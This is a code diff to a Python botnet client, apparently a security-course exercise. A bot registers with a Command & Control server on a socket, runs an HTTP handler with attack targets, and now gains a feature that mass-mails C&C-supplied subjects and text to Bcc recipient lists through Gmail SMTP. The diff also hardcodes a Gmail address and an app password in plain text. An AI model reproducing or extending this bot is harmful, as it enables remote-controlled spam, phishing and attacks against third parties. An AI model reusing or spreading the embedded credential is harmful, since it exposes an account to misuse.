@@ -1,18 +1,23 @@
 import atexit
 import contextlib
 import platform
+import smtplib
 import threading
 import requests
 import socket
 import json
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from email.mime.text import MIMEText
 
 
 class Bot(BaseHTTPRequestHandler):
-    status = {'action': 'Idle', 'targets': []}
+    status = {'action': 'Idle', 'targets': []}  # TODO list of actions
     lock = threading.Lock()
     stop = threading.Event()
+    smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+    user = "botnetsicurezza@gmail.com"
+    password = "cebqshlncuewhjso"
 
     def __response_body(self, func):
         self.send_response(200)
@@ -52,10 +57,9 @@ class Bot(BaseHTTPRequestHandler):
     def __start_email(self):
         length = int(self.headers['Content-Length'])
         payload = json.loads(self.rfile.read(length).decode('utf-8'))
-        # TODO send email to the given address
-        print(payload['emails'])
-        print(payload['subj'])
-        print(payload['txt'])
+
+        emailing = threading.Thread(target=Bot.__email, args=(self, payload['emails'], payload['subj'], payload['txt']))
+        emailing.start()
         self.send_response(200)
 
     def __start_attack(self):
@@ -100,18 +104,32 @@ class Bot(BaseHTTPRequestHandler):
             self.status['action'] = "Idle"
             self.status['targets'].clear()
 
+    def __email(self, emails, subj, text):
+        with self.lock:
+            user = self.user
+            self.smtp_server.login(user, self.password)
+
+        message = MIMEText(text)
+        message['Subject'] = subj
+        message['From'] = user
+        message['Bcc'] = ', '.join(emails)
+
+        with self.lock:
+            self.smtp_server.send_message(message)
+            self.smtp_server.quit()
+
 
 CNC_ADDR = '127.0.0.1'  # "10.0.2.15"
 CNC_PORT = 60000
 
 
-def start(port):
+def connect(port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((CNC_ADDR, CNC_PORT))
         s.send(str(port).encode('utf-8'))
 
 
-def exit_handler():
+def disconnect():
     with contextlib.suppress(ConnectionRefusedError):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((CNC_ADDR, CNC_PORT))
@@ -121,9 +139,9 @@ if __name__ == '__main__':
     bot = HTTPServer(('', 0), Bot)
 
     try:
-        start(bot.server_port)
+        connect(bot.server_port)
         print("Connected to the Command & Control")
-        atexit.register(exit_handler)
+        atexit.register(disconnect)
         bot.serve_forever()
     except ConnectionRefusedError as e:
         print("Cannot establish the connection to Command & Control")
